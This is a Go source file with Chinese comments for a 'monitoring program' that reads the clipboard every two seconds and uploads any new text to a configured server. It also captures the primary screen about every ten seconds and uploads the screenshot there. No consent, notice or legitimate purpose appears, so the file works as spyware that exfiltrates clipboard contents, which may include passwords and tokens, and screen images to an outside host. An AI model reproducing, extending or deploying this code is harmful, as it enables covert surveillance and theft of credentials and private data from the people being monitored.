package main

import (
	"bytes"
	"fmt"
	"image/png"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"time"

	"github.com/kbinani/screenshot"
	"golang.design/x/clipboard"
)

// --- 配置 ---
// !!!重要!!!: 请将这里的 IP 地址和端口替换为你的服务器的实际地址。
const serverEndpoint = "https://PPPoE"
const uploadClipboardURL = serverEndpoint + "/api/clipboard"
const uploadScreenshotURL = serverEndpoint + "/api/screenshot"

// 监控频率
const checkInterval = 2 * time.Second

var lastClipboardContent = ""

func main() {
	// 初始化剪贴板
	err := clipboard.Init()
	if err != nil {
		log.Fatalf("无法初始化剪贴板: %v", err)
	}

	log.Println("监控程序已启动...")

	// 创建一个定时器
	ticker := time.NewTicker(checkInterval)
	defer ticker.Stop()

	// 立即执行一次，避免启动时等待
	runChecks()
	i := 0
	// 循环执行
	for range ticker.C {
		checkAndUploadClipboard()
		i++
		if i == 5 {
			captureAndUploadScreen()
			i = 0
		}
	}

}

func runChecks() {
	// 检查并上传剪贴板
	checkAndUploadClipboard()
	// 截屏并上传
	captureAndUploadScreen()
}

// 检查剪贴板内容，如果变化则上传
func checkAndUploadClipboard() {
	// 读取剪贴板中的文本内容
	content := clipboard.Read(clipboard.FmtText)

	currentContent := string(content)

	// 与上一次内容比较，如果不同则上传
	if currentContent != "" && currentContent != lastClipboardContent {
		log.Printf("检测到新的剪贴板内容: %s", currentContent)
		err := uploadText(uploadClipboardURL, currentContent)
		if err != nil {
			log.Printf("上传剪贴板内容失败: %v", err)
		} else {
			// 上传成功后更新缓存
			lastClipboardContent = currentContent
			log.Println("剪贴板内容上传成功。")
		}
	}
}

// 截取屏幕并上传
func captureAndUploadScreen() {
	// 获取所有屏幕的数量
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		log.Println("没有找到活动的显示器。")
		return
	}

	// 我们只截取主屏幕 (索引为 0)
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		log.Printf("截取屏幕失败: %v", err)
		return
	}

	// 将 image.RGBA 转换为 []byte
	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		log.Printf("PNG 编码失败: %v", err)
		return
	}

	// 上传图片
	err = uploadFile(uploadScreenshotURL, "screenshot.png", &buf)
	if err != nil {
		log.Printf("上传屏幕截图失败: %v", err)
	} else {
		log.Println("屏幕截图上传成功。")
	}
}

// 上传文本内容的通用函数
func uploadText(url string, text string) error {
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(text))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "text/plain")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("服务器返回错误: %s, %s", resp.Status, string(body))
	}
	return nil
}

// 上传文件的通用函数
func uploadFile(url string, filename string, filedata io.Reader) error {
	var b bytes.Buffer
	w := multipart.NewWriter(&b)

	// 创建一个 form-data 字段
	fw, err := w.CreateFormFile("upload", filename)
	if err != nil {
		return err
	}

	// 将文件内容拷贝到 form-data 字段
	if _, err = io.Copy(fw, filedata); err != nil {
		return err
	}

	// 必须关闭 writer，这样才会写入结尾的 boundary
	w.Close()

	req, err := http.NewRequest("POST", url, &b)
	if err != nil {
		return err
	}
	// 设置 Content-Type，这里包含了 multipart/form-data 的 boundary
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("服务器返回错误: %s, %s", resp.Status, string(body))
	}
	return nil
}
